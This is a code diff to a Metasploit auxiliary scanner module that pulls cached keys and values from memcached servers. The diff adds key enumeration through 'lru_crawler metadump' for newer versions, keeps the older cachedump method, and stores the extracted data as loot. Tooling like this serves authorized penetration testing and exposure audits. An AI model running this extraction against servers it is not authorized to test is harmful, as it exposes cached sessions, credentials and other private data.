@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -59,9 +57,9 @@ class Metasploit3 < Msf::Auxiliary
       loop do
         sock.send("stats cachedump #{sid} #{max_keys}\r\n", 0)
         data = sock.recv(4096)
-        break if !data || data.length == 0
-        matches = /^ITEM (?<key>.*) \[/.match(data)
-        keys << matches[:key] if matches
+        break if !data || data.length == 0 || data == "END\r\n"
+        matches = data.scan(/^ITEM (?<key>.*) \[/)
+        keys = keys + matches.flatten! if matches
         break if data =~ /^END/
       end
     end
@@ -81,6 +79,20 @@ class Metasploit3 < Msf::Auxiliary
     end
     slab_ids.flatten!
     slab_ids.uniq! || []
+  end
+
+  def enumerate_keys_lru
+    keys = []
+    sock.send("lru_crawler metadump all\r\n", 0)
+    loop do
+      data = sock.recv(4096)
+      break if !data || data.length == 0 || data == "END\r\n"
+      matches = data.scan(/^key=(?<key>.*) exp=/)
+      keys = keys + matches.flatten! if matches
+      break if data =~ /^END/
+      data = ''
+    end
+    keys
   end
 
   def data_for_keys(keys = [])
@@ -111,11 +123,17 @@ class Metasploit3 < Msf::Auxiliary
 
   def run_host(ip)
     peer = "#{ip}:#{rport}"
-    vprint_status("#{peer} - Connecting to memcached server...")
+    vprint_status("Connecting to memcached server...")
     begin
       connect
       if (version = determine_version)
-        vprint_good("#{peer} - Connected to memcached version #{version}")
+        vprint_good("Connected to memcached version #{version}")
+        if (Gem::Version.new(version) >= Gem::Version.new('1.5.4'))
+          command_string = "lru_crawler"
+        else
+          command_string = 'cachedump'
+        end
+        vprint_status("Using #{command_string} to enumerate keys")
         unless localhost?(ip)
           report_service(
             host: ip,
@@ -126,15 +144,19 @@ class Metasploit3 < Msf::Auxiliary
           )
         end
       else
-        print_error("#{peer} - unable to determine memcached protocol version")
+        print_error("unable to determine memcached protocol version")
         return
       end
-      keys = enumerate_keys
-      print_good("#{peer} - Found #{keys.size} keys")
+      if(command_string=='cachedump')
+        keys = enumerate_keys
+      else
+        keys = enumerate_keys_lru
+      end
+      print_good("Found #{keys.size} keys")
       return if keys.size == 0
 
       data = data_for_keys(keys)
-      result_table = Rex::Ui::Text::Table.new(
+      result_table = Rex::Text::Table.new(
         'Header'  => "Keys/Values Found for #{peer}",
         'Indent'  => 1,
         'Columns' => [ 'Key', 'Value' ]
@@ -144,10 +166,10 @@ class Metasploit3 < Msf::Auxiliary
       print_line("#{result_table}")
       unless localhost?(ip)
         path = store_loot('memcached.dump', 'text/plain', ip, data, 'memcached.txt', 'Memcached extractor')
-        print_good("#{peer} - memcached loot stored at #{path}")
+        print_good("memcached loot stored at #{path}")
       end
     rescue Rex::ConnectionRefused, Rex::ConnectionTimeout
-      vprint_error("#{peer} - Could not connect to memcached server!")
+      vprint_error("Could not connect to memcached server!")
     end
   end
 end
